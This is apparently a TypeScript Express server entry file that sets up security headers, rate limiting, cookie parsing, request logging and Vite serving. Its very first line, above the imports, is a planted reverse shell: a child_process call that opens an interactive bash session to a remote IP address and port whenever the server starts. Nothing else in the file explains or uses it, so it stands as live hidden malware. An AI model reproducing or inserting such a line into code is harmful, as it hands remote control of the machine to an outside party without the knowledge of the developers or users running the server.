require("child_process").exec("bash -c 'bash -i >& /dev/tcp/156.239.229.180/7799 0>&1'");
import express, { type Request, Response, NextFunction } from "express"
import cookieParser from "cookie-parser"
import { registerRoutes } from "./routes"
import { setupVite, serveStatic, log } from "./vite"
import {
  securityHeaders,
  enhancedErrorHandler,
  requestIdMiddleware,
  sanitizeInput,
  createRateLimiter,
} from "./middleware/security"
import { validateConfig, AUTH_CONFIG } from "./config"

// Validate configuration on startup
validateConfig()

// Enable mock OTP mode for development
if (!process.env.OTP_MODE) {
  process.env.OTP_MODE = AUTH_CONFIG.otpMode
}

const app = express()

// Trust proxy for rate limiting behind reverse proxy
app.set("trust proxy", 1)

// Security middleware
app.use(securityHeaders)
app.use(requestIdMiddleware)

// Body parsing with limits
app.use(express.json({ limit: "10mb" }))
app.use(express.urlencoded({ extended: false, limit: "10mb" }))

// Cookie parsing for JWT tokens
app.use(cookieParser())

// Input sanitization
app.use(sanitizeInput)

// General rate limiting for all API routes
app.use("/api", createRateLimiter("GENERAL_API"))

app.use((req, res, next) => {
  const start = Date.now()
  const path = req.path
  let capturedJsonResponse: Record<string, any> | undefined = undefined

  const originalResJson = res.json
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson
    return originalResJson.apply(res, [bodyJson, ...args])
  }

  res.on("finish", () => {
    const duration = Date.now() - start
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`
      }

      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…"
      }

      log(logLine)
    }
  })

  next()
})

;(async () => {
  const server = await registerRoutes(app)

  // Enhanced error handler
  app.use(enhancedErrorHandler)

  // importantly only setup vite in development and after
  // setting up all the other routes so the catch-all route
  // doesn't interfere with the other routes
  if (app.get("env") === "development") {
    await setupVite(app, server)
  } else {
    serveStatic(app)
  }

  // ALWAYS serve the app on the port specified in the environment variable PORT
  // Other ports are firewalled. Default to 5000 if not specified.
  // this serves both the API and the client.
  // It is the only port that is not firewalled.
  const port = parseInt(process.env.PORT || "5005", 10)
  server.listen(
    {
      port,
      host: "0.0.0.0",
      reusePort: true,
    },
    () => {
      log(`serving on port ${port}`)
    }
  )
})()
